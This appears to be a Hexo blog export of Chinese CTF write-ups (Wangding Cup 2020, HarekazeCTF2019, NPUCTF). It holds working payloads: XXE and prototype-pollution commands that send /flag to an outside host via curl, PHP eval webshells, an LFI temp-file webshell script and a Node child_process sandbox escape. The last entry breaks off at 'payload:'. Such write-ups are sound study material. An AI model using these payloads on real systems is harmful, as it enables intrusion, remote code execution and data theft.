    <title>2020wdb_Wp</title>
    <url>/2020/05/11/2020wdb-Wp/</url>
    <content><![CDATA[<h1><span id="2020年第二届网鼎杯网络安全大赛青龙组">2020年第二届“网鼎杯”网络安全大赛青龙组</span></h1><p>[TOC]</p>
<!-- toc -->

<ul>
<li><a href="#0x00-misc签到">0x00 Misc签到</a><ul>
<li><a href="#操作内容">操作内容：</a></li>
<li><a href="#flag">flag：</a></li>
</ul>
</li>
<li><a href="#0x01-areuserialz">0x01 AreUSerialz</a><ul>
<li><a href="#操作内容">操作内容:</a></li>
<li><a href="#flag-1">flag：</a></li>
</ul>
</li>
<li><a href="#0x02-filejava">0x02 filejava</a><ul>
<li><a href="#操作内容-1">操作内容：</a></li>
<li><a href="#flag-2">flag：</a></li>
</ul>
</li>
<li><a href="#0x03-notes">0x03 notes</a><ul>
<li><a href="#操作内容-2">操作内容：</a></li>
<li><a href="#flag">flag:</a></li>
</ul>
</li>
<li><a href="#0x04-bang">0x04 bang</a><ul>
<li><a href="#操作内容-3">操作内容：</a></li>
<li><a href="#flag-3">flag：</a></li>
</ul>
</li>
<li><a href="#0x05-re_signal">0x05 Re_signal</a><ul>
<li><a href="#操作内容-4">操作内容：</a></li>
<li><a href="#flag-4">flag：</a></li>
</ul>
</li>
<li><a href="#0x06-joker">0x06 joker</a><ul>
<li><a href="#操作内容-5">操作内容：</a></li>
<li><a href="#flag-1">flag:</a></li>
</ul>
</li>
<li><a href="#0x07-boom">0x07 Boom</a><ul>
<li><a href="#操作内容">操作内容</a></li>
<li><a href="#flag-5">flag：</a></li>
</ul>
</li>
<li><a href="#0x08-you-raise-me-up">0x08 you raise me up</a><ul>
<li><a href="#操作内容-1">操作内容</a></li>
<li><a href="#flag-2">flag:</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h2><span id="0x00-misc签到">0x00 Misc签到</span></h2><h3><span id="操作内容">操作内容：</span></h3><p>答对15道题，控制台就有flag</p>
<h3><span id="flag">flag：</span></h3><p><img src="/2020/05/11/2020wdb-Wp/1.png" alt></p>
<h2><span id="0x01-areuserialz">0x01 AreUSerialz</span></h2><h3><span id="操作内容">操作内容:</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> (serialize($a));</span><br></pre></td></tr></table></figure>

<p><code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<h3><span id="flag">flag：</span></h3><p>flag{06c43628-fc7a-480b-b68d-0386f00ab0df}</p>
<h2><span id="0x02-filejava">0x02 filejava</span></h2><h3><span id="操作内容">操作内容：</span></h3><p>有任意文件读取，但是读不到/flag<br>尝试读取<code>../../../web.xml</code><br>找到具体的包名和servlet名字<br>然后发现文件名要改成<code>excel-</code>开头</p>
<p>CVE-2014-3529<br><a href="https://xz.aliyun.com/t/6996" target="_blank" rel="noopener">https://xz.aliyun.com/t/6996</a><br>[Content_Types].xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://vpsip/file.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>找个vps部署<br>file.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://vpsip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>监听9999端口，拿到flag</p>
<h3><span id="flag">flag：</span></h3><p><img src="https://s1.ax1x.com/2020/05/10/Y3O456.png" alt></p>
<h2><span id="0x03-notes">0x03 notes</span></h2><h3><span id="操作内容">操作内容：</span></h3><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10795" target="_blank" rel="noopener">CVE-2019-10795</a></a></p>
<p>undefsafe &lt; 2.0.3 污染原型链</p>
<p>题中<code>undefsafe(this.note_list, id + &#39;.author&#39;, author);</code>会导致原型链污染</p>
<p>/edit_note使用payload<code>{&quot;id&quot;:&quot;__proto__&quot;,&quot;author&quot;:&quot;curl 47.102.102.31:9999&quot;,&quot;raw&quot;:&quot;curl 47.102.102.31:9999&quot;}</code>会触发污染</p>
<p>访问status，本地调试可以发现发现object污染成功</p>
<p><img src="/2020/05/11/2020wdb-Wp/image-20200510183036397.png" alt="image-20200510183036397"></p>
<p>最后使用payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;id&quot;:&quot;__proto__&quot;,&quot;author&quot;:&quot;curl 47.102.102.31:9999/?a=`cat /flag`&quot;,&quot;raw&quot;:&quot;curl 47.102.102.31:9999/`cat /flag`&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>服务器成功拿到flag</p>
<h3><span id="flag">flag:</span></h3><p><img src="/2020/05/11/2020wdb-Wp/image-20200510183155900.png" alt="image-20200510183155900"></p>
<h2><span id="0x04-bang">0x04 bang</span></h2><h3><span id="操作内容">操作内容：</span></h3><p>jadx打开发现是邦邦的壳</p>
<p><img src="/2020/05/11/2020wdb-Wp/image-20200510184010579.png" alt="image-20200510184010579"></p>
<p>手机上启动frida-server，电脑端使用使用脱壳工具<a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">https://github.com/hluwa/FRIDA-DEXDump</a>一键脱壳</p>
<p><img src="/2020/05/11/2020wdb-Wp/1.jpg" alt="1"></p>
<p>脱壳后jadx打开dex发现flag</p>
<p><img src="/2020/05/11/2020wdb-Wp/2.png" alt="2"></p>
<h3><span id="flag">flag：</span></h3><p>flag{borring_things}</p>
<h2><span id="0x05-re_signal">0x05 Re_signal</span></h2><h3><span id="操作内容">操作内容：</span></h3><p>根据v4数组中的值进行操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line">a=[<span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x18</span>,<span class="number">0xA7</span>,<span class="number">0x31</span>,<span class="number">0xF1</span>,<span class="number">0x28</span>,<span class="number">0x84</span>,<span class="number">0xC1</span>,<span class="number">0x1E</span>,<span class="number">0x7A</span>]</span><br><span class="line">b=<span class="string">''</span></span><br><span class="line">b+=chr((a[<span class="number">0</span>]+<span class="number">5</span>)^<span class="number">0x10</span>)+chr((a[<span class="number">1</span>]/<span class="number">3</span>)^<span class="number">0x20</span>)+chr(a[<span class="number">2</span>]+<span class="number">3</span>)+chr((a[<span class="number">3</span>]^<span class="number">4</span>)<span class="number">-1</span>)+chr((a[<span class="number">4</span>]+<span class="number">0x21</span>)/<span class="number">3</span>)+\</span><br><span class="line">  chr(a[<span class="number">5</span>]+<span class="number">2</span>)+chr((a[<span class="number">6</span>]+<span class="number">0x20</span>)^<span class="number">9</span>)+chr((a[<span class="number">7</span>]^<span class="number">0x24</span>)<span class="number">-0x51</span>)+chr(a[<span class="number">8</span>])+chr((a[<span class="number">9</span>]<span class="number">-0x25</span>)/<span class="number">2</span>)+\</span><br><span class="line">  chr((a[<span class="number">10</span>]^<span class="number">0x41</span>)<span class="number">-0x36</span>)+chr(a[<span class="number">11</span>]<span class="number">-0x20</span>)+chr((a[<span class="number">12</span>]<span class="number">-0x25</span>)/<span class="number">3</span>)+chr((a[<span class="number">13</span>]+<span class="number">0x20</span>)^<span class="number">9</span>)+chr(a[<span class="number">14</span>]<span class="number">-0x42</span>)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>

<h3><span id="flag">flag：</span></h3><p>flag{757515121f3d478}</p>
<h2><span id="0x06-joker">0x06 joker</span></h2><h3><span id="操作内容">操作内容：</span></h3><p>简单的异或<br><img src="/2020/05/11/2020wdb-Wp/4.png" alt><br><img src="/2020/05/11/2020wdb-Wp/3.png" alt><br><img src="/2020/05/11/2020wdb-Wp/5.png" alt><br>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">""</span>.join([chr(ord(<span class="string">b'hahahaha_do_you_find_me?'</span>[i]) ^ ord(idaapi.dbg_read_memory(<span class="number">0x403040</span>+<span class="number">4</span>*i, <span class="number">1</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>)])+base64.b16decode(<span class="string">"%02X"</span>%(<span class="number">0x4747474747L</span>^<span class="number">0x257470263A</span>))</span><br></pre></td></tr></table></figure>

<h3><span id="flag">flag:</span></h3><p>flag{d07abccf8a410cb37a}</p>
<h2><span id="0x07-boom">0x07 Boom</span></h2><h3><span id="操作内容">操作内容</span></h3><p>打开文件，首先算md5为en5oy，然后算三元三次方程，最后算一元二次方程得到flag。<br><img src="/2020/05/11/2020wdb-Wp/8.png" alt></p>
<h3><span id="flag">flag：</span></h3><p>flag{en5oy_746831_89127561}</p>
<h2><span id="0x08-you-raise-me-up">0x08 you raise me up</span></h2><h3><span id="操作内容">操作内容</span></h3><p>根据代码c = pow(m, bytes_to_long(flag), n)可知为离散，需要求bytes_to_long(flag)的值。<br>因为求离散对数，所以直接用sagemath中的discrete_log()函数。<br>直接构造脚本如下：<br><img src="/2020/05/11/2020wdb-Wp/6.png" alt><br>然后将其转化为字符串得到flag：<br><img src="/2020/05/11/2020wdb-Wp/7.png" alt></p>
<h3><span id="flag">flag:</span></h3><p>flag{5f95ca93-1594-762d-ed0b-a9139692cb4a}</p>
]]></content>
  </entry>
  <entry>
    <title>CTFshow_36D_Web_Wp</title>
    <url>/2020/05/04/CTFshow-36D-Web-Wp/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>First Blog</title>
    <url>/2019/09/16/First-Blog/</url>
    <content><![CDATA[<h1><span id="first-blog">First Blog</span></h1><hr>
<h2><span id="dkk">dkk</span></h2><p>CTF圈中大二菜🐶一枚，师傅们ddddhm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();//test</span><br></pre></td></tr></table></figure>

<p>博客使用hexo的Cactus主题</p>
]]></content>
  </entry>
  <entry>
    <title>HarekazeCTF2019</title>
    <url>/2019/11/22/HarekazeCTF2019/</url>
    <content><![CDATA[<h1><span id="复现一波harekazectf_web">复现一波HarekazeCTF_Web</span></h1><h2><span id="encode_and_encode">encode_and_encode</span></h2><p>给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p><code>POST page</code>传文件名进去，文件内容给了<code>content</code>,最后输出<code>content</code>，但是有正则过滤<br>php的json_decode()自动会把<code>Unicode</code>转换，也就是<code>\u0066\u006c\u0061\u0067 ==&gt; flag</code><br><img src="/2019/11/22/HarekazeCTF2019/1.png" alt><br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/flag</span><br><span class="line">&#123;&quot;page&quot;:&quot;\u002f\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>传了<code>/flag</code>回显<code>{&quot;content&quot;:&quot;&lt;p&gt;not found&lt;\/p&gt;\n&quot;}</code>。。。也没有flag.php，结果是<code>flag</code>正则被waf了<br>用php伪协议读flag的base64</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>##</p>
]]></content>
  </entry>
  <entry>
    <title>NPUCTF_Web_Wp</title>
    <url>/2020/04/22/NPUCTF-Web-Wp/</url>
    <content><![CDATA[<h1><span id="npuctf_web_wp">NPUCTF_Web_Wp</span></h1><p>[TOC]</p>
<h2><span id="查源码">查源码</span></h2><p><code>view-source:</code>查看源码</p>
<h2><span id="readlezphp">ReadlezPHP</span></h2><p><code>/time.php?source</code>查看源码<br>反序列化<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'eval($_REQUEST[820]);'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">'assert'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p><code>time.php?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:21:&quot;eval($_REQUEST[820]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}&amp;820=phpinfo();</code></p>
<h2><span id="ezinclude">ezinclude</span></h2><p>查看源码有个<code>&lt;!--md5($secret.$name)===$pass --&gt;</code><br>以为是哈希长度拓展攻击，发现直接<code>user=admin&amp;pass=973225ae4fc8977f86d1a330b0774630</code>就进去了<br>预期应该是<code>hashpump</code>试长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url=<span class="string">'xxxxxx'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">'a3dabbc779f2fbf8b6f56113ca78a7f9'</span>,<span class="string">'123444'</span>,<span class="string">'1'</span>,i)</span><br><span class="line">    req=requests.get(url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username/password error'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(req.text,url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br></pre></td></tr></table></figure>

<p>进到<code>flflflflag.php</code>有任意文件读取，但是把<code>data|input|zip</code>过滤了正常姿势不能getshell了<br><a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">https://www.jianshu.com/p/dfd049924258</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以导致 php 在执行过程中 Segment Fault</span><br><span class="line">想到可以利用在本地文件包含漏洞中</span><br><span class="line">之前在网上的分析文章中 , 本地文件包含漏洞可以让 php 包含自身从而导致死循环</span><br><span class="line">然后 php 就会崩溃 , 如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留</span><br><span class="line"></span><br><span class="line">作者：王一航</span><br><span class="line">链接：https://www.jianshu.com/p/dfd049924258</span><br><span class="line">来源：简书</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"> </span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url = <span class="string">"http://f14f9785-1fd6-43c4-a556-b2469171fc61.node3.buuoj.cn/flflflflag.php"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/dkkk", base64_decode("%s")))?&gt;'</span> % (webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s?file=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>文件读一下<code>/tmp/phpxxxxxx</code>就把shell写进<code>/tmp/dkkk</code>了，直接包含getshell</p>
<p>好像有师傅<code>upload_progress</code>写shell成功了，俺没试成功呜呜呜tcl</p>
<h2><span id="超简单的php超简单">超简单的PHP！！！超简单！！！</span></h2><p>利用多行注释往session写shell</p>
<h2><span id="验证">验证🐎</span></h2><p>node的题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>第一步要过<code>if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0]))</code><br>看<a href="https://www.gem-love.com/websecurity/2037.html" target="_blank" rel="noopener">Y1ng师傅之前的文章</a><br>利用js弱类型<br>payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"e"</span>:payload,<span class="attr">"first"</span>:<span class="string">"0"</span>,<span class="attr">"second"</span>:[<span class="number">0</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>第二层是<code>if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;))</code><br>只能使用<code>Math.xxxxx[()+\-*/&amp;|^%&lt;&gt;=,?:]</code></p>
<p>ES6中允许使用“箭头”(=&gt;)定义函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="params">v</span> =&gt;</span> v; </span><br><span class="line">相当于</span><br><span class="line"><span class="keyword">var</span> <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">encode = <span class="keyword">lambda</span> code: list(map(ord,code))</span><br><span class="line">decode = <span class="keyword">lambda</span> code: <span class="string">""</span>.join(map(chr,code))</span><br><span class="line">a=<span class="string">f"""</span></span><br><span class="line"><span class="string">(m0=&gt;(</span></span><br><span class="line"><span class="string">        m0=m0.constructor,</span></span><br><span class="line"><span class="string">        m0.x=m0.constructor(</span></span><br><span class="line"><span class="string">            m0.fromCharCode(<span class="subst">&#123;encode(<span class="string">"return process.mainModule.require('child_process').execSync('cat /flag')"</span>)&#125;</span>)</span></span><br><span class="line"><span class="string">        )()</span></span><br><span class="line"><span class="string">    ))(Math+1)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">a=re.sub(<span class="string">r"[\s\[\]]"</span>, <span class="string">""</span>, a).replace(<span class="string">"m0"</span>,<span class="string">"Math"</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
